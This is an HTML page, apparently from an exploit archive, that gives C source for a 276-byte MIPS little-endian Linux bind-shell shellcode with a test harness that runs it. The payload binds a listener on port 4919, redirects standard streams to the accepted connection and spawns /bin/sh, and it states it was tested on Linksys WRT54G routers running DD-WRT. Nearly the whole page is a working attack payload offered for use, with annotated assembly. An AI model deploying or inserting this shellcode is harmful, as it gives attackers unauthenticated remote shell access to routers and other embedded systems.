<html><head><title>Linux/mips - port bind 4919 - 276 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*	- MIPS little-endian 
 *	- linux port listener 276 bytes shellcode 
 *	- execve(&quot;/bin/sh&quot;,[&quot;/bin/sh&quot;],[]);
 *	- port 0x1337 (4919)
 *	- tested on Linksys WRT54G/GL (DD-WRT Linux)
 *      - based on scut paper Writing MIPS/Irix shellcode
 *
 * 				vaicebine at gmail dot com
 */
#include &quot;stdio.h&quot;

char port_bind_shellcode[] = 
	&quot;\xe0\xff\xbd\x27&quot;	/*     addiu   sp,sp,-32                */
	&quot;\xfd\xff\x0e\x24&quot;	/*     li      t6,-3                    */
	&quot;\x27\x20\xc0\x01&quot;	/*     nor     a0,t6,zero               */
	&quot;\x27\x28\xc0\x01&quot;	/*     nor     a1,t6,zero               */
	&quot;\xff\xff\x06\x28&quot;	/*     slti    a2,zero,-1               */	
	&quot;\x57\x10\x02\x24&quot;	/*     li      v0,4183 ( __NR_socket )  */
	&quot;\x0c\x01\x01\x01&quot;	/*     syscall                          */
	&quot;\x50\x73\x0f\x24&quot;	/*     li      t7,0x7350 (nop)          */
	&quot;\xff\xff\x50\x30&quot;	/*     andi    s0,v0,0xffff             */	
	&quot;\xef\xff\x0e\x24&quot;	/*     li      t6,-17                   */
	&quot;\x27\x70\xc0\x01&quot;	/*     nor     t6,t6,zero               */
	&quot;\x13\x37\x0d\x24&quot;	/*     li      t5,0x3713 (port 0x1337)  */
	&quot;\x04\x68\xcd\x01&quot;	/*     sllv    t5,t5,t6                 */
	&quot;\xff\xfd\x0e\x24&quot;	/*     li      t6,-513                  */
	&quot;\x27\x70\xc0\x01&quot;	/*     nor     t6,t6,zero               */
	&quot;\x25\x68\xae\x01&quot;	/*     or      t5,t5,t6                 */
	&quot;\xe0\xff\xad\xaf&quot;	/*     sw      t5,-32(sp)               */
	&quot;\xe4\xff\xa0\xaf&quot;	/*     sw      zero,-28(sp)             */	
	&quot;\xe8\xff\xa0\xaf&quot;	/*     sw      zero,-24(sp)             */
	&quot;\xec\xff\xa0\xaf&quot;	/*     sw      zero,-20(sp)             */
	&quot;\x25\x20\x10\x02&quot;	/*     or      a0,s0,s0                 */
	&quot;\xef\xff\x0e\x24&quot;	/*     li      t6,-17                   */
	&quot;\x27\x30\xc0\x01&quot;	/*     nor     a2,t6,zero               */
	&quot;\xe0\xff\xa5\x23&quot;	/*     addi    a1,sp,-32                */
	&quot;\x49\x10\x02\x24&quot;	/*     li      v0,4169 ( __NR_bind )    */
	&quot;\x0c\x01\x01\x01&quot;	/*     syscall                          */
	&quot;\x50\x73\x0f\x24&quot;	/*     li      t7,0x7350 (nop)          */
	&quot;\x25\x20\x10\x02&quot;	/*     or      a0,s0,s0                 */
	&quot;\x01\x01\x05\x24&quot;	/*     li      a1,257                   */
	&quot;\x4e\x10\x02\x24&quot;	/*     li      v0,4174 ( __NR_listen )  */	
	&quot;\x0c\x01\x01\x01&quot;	/*     syscall                          */
	&quot;\x50\x73\x0f\x24&quot;	/*     li      t7,0x7350 (nop)          */
	&quot;\x25\x20\x10\x02&quot;	/*     or      a0,s0,s0                 */
	&quot;\xff\xff\x05\x28&quot;	/*     slti    a1,zero,-1               */
	&quot;\xff\xff\x06\x28&quot;	/*     slti    a2,zero,-1               */
	&quot;\x48\x10\x02\x24&quot;	/*     li      v0,4168 ( __NR_accept )  */
	&quot;\x0c\x01\x01\x01&quot;	/*     syscall                          */
	&quot;\x50\x73\x0f\x24&quot;	/*     li      t7,0x7350 (nop)          */
	&quot;\xff\xff\x50\x30&quot;	/*     andi    s0,v0,0xffff             */	
	&quot;\x25\x20\x10\x02&quot;	/*     or      a0,s0,s0                 */
	&quot;\xfd\xff\x0f\x24&quot;	/*     li      t7,-3                    */
	&quot;\x27\x28\xe0\x01&quot;	/*     nor     a1,t7,zero               */
	&quot;\xdf\x0f\x02\x24&quot;	/*     li      v0,4063 ( __NR_dup2 )    */
	&quot;\x0c\x01\x01\x01&quot;	/*     syscall                          */
	&quot;\x50\x73\x0f\x24&quot;	/*     li      t7,0x7350 (nop)          */
	&quot;\x25\x20\x10\x02&quot;	/*     or      a0,s0,s0                 */
	&quot;\x01\x01\x05\x28&quot;	/*     slti    a1,zero,0x0101           */
	&quot;\xdf\x0f\x02\x24&quot;	/*     li      v0,4063 ( __NR_dup2 )    */
	&quot;\x0c\x01\x01\x01&quot;	/*     syscall                          */
	&quot;\x50\x73\x0f\x24&quot;	/*     li      t7,0x7350 (nop)          */
	&quot;\x25\x20\x10\x02&quot;	/*     or      a0,s0,s0                 */
	&quot;\xff\xff\x05\x28&quot;	/*     slti    a1,zero,-1               */	
	&quot;\xdf\x0f\x02\x24&quot;	/*     li      v0,4063 ( __NR_dup2 )    */
	&quot;\x0c\x01\x01\x01&quot;	/*     syscall                          */
	&quot;\x50\x73\x0f\x24&quot;	/*     li      t7,0x7350 (nop)          */
	&quot;\x50\x73\x06\x24&quot;	/*     li      a2,0x7350                */
	&quot;\xff\xff\xd0\x04&quot;	/* LB: bltzal  a2,LB                    */
	&quot;\x50\x73\x0f\x24&quot;	/*     li      t7,0x7350 (nop)          */
	&quot;\xff\xff\x06\x28&quot;	/*     slti    a2,zero,-1               */
	&quot;\xdb\xff\x0f\x24&quot;	/*     li      t7,-37                   */
	&quot;\x27\x78\xe0\x01&quot;	/*     nor     t7,t7,zero               */
	&quot;\x21\x20\xef\x03&quot;	/*     addu    a0,ra,t7                 */
	&quot;\xf0\xff\xa4\xaf&quot;	/*     sw      a0,-16(sp)               */
	&quot;\xf4\xff\xa0\xaf&quot;	/*     sw      zero,-12(sp)             */
	&quot;\xf0\xff\xa5\x23&quot;	/*     addi    a1,sp,-16                */
	&quot;\xab\x0f\x02\x24&quot;	/*     li      v0,4011 ( __NR_execve )  */
	&quot;\x0c\x01\x01\x01&quot;	/*     syscall                          */
	&quot;/bin/sh&quot;;

int main()
{
    void (*p)(void);
    p = port_bind_shellcode;
    printf(&quot;shellcode size %d\n&quot;, sizeof(port_bind_shellcode));
    p();

    return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
